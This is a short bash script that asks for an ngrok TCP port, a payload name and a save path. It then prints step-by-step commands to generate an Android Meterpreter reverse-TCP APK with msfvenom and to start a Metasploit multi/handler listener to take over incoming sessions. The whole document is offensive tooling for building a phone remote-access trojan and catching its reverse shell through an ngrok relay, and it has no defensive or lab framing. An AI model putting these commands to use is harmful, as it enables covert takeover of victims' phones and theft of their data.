clear
read -p "Enter ngrok tcp port: " n2
read -p "Enter payload name: " n3
read -p "saved payload path: " n4

echo "./ngrok tcp $n2"
echo "msfvenom -p android/meterpreter/reverse_tcp LHOST=ngrok ip LPORT=ngrok port -o $n3.apk"
echo "mv $n3.apk $n4"
echo "
         msfconsole
        use exploit/multi/handler
        set payload android/meterpreter/reverse_tcp
        set LHOST 0.0.0.0
        set LPORT $n2
=> run a payload <=

exploit -j
sessions -i
sessions -i {type session number}


        
      "
